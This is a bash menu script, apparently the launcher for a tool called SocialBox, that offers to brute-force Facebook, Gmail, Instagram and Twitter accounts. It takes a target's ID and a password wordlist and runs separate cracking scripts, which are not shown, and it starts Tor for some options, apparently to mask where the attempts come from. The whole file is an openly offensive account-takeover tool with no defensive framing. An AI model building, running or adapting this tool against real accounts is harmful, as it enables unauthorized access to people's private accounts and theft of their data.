#!/bin/bash
#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
#ROOT PRIVILEGIES
#if [[ $EUID -ne 0 ]]; then
#        exit 1
#fi
#Installation
sleep 1
echo -e "Checking Installation  "
bash install-sb.sh
echo -e "Checking Completed  "
sleep 1
clear
#Startup
#echo -e "	[+]          Coded By TRAKOS         		   [+]"
#echo -e "	[+] 		 		   [+]"
#echo -e "	[+] 		         		   [+]"
#echo -e " TRAKOS Eagle, init__0}  [+]"
echo ""
echo  "Select From Menu : "
echo ""
echo  "1 : Brute Force Facebook Account"
echo "2 : Brute Force Gmail Account"
echo "3 : Brute Force Instagram Account"
echo "4 : Brute Force Twitter Account"
echo "99: Exit"
read -p "Choice >  " ch
if [ $ch = 1 ]; then
echo "Facebook Brute Force"
read -p "Enter Facebook ID / Email / Username / Number: " id
read -p "Enter wordlist path : " wordlist
cd facebook
perl fb-brute.pl $id $wordlist
echo  "[+] Brute Force Complete  [✓]  [+]"

read -p "Back To Main Menu [ Y / n ] : " check
echo -e " "
if [ $check = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 2 ]; then
echo  "Gmail Brute Force "
cd Gemail-Hack
python gemailhack.py
echo "[+] Brute Force Complete  [✓]  [+]"

read -p "Back To Main Menu [ Y / n ] : " check2
echo -e " "
if [ $check2 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 3 ]; then
echo  "Instagram Brute Force "
cd instainsane/
sleep 0.025
	echo  "	[+] tor  [+]"
sleep 0.9
service tor start
./instainsane.sh
echo  "[+]Brute Force Complete  [✓]  [+]"
service tor stop
#echo -e "		[+]$red Service Tor Stopped  [+]"
read -p "Back To Main Menu [ Y / n ] : " check3

if [ $check3 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 4 ]; then
echo "Twitter Brute Force"
cd tweetshell/
sleep 0.025
echo  "[+] Service Tor Stated  [+]"
sleep 0.9
service tor start
bash tweetshell.sh
echo  "[+] Brute Force Complete  [ ✓ ]  [+]"
service tor stop
echo -p "[+] Service Tor Stopped  [+]"

read -p "Back To Main Menu [ Y / n ] : " check4
echo -e " "
if [ $check4 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch == 99 ]; then
echo -e "Program Exit ... "
sleep 0.25
exit 1
else
echo "Not Found 404 , Exit"
exit 1
fi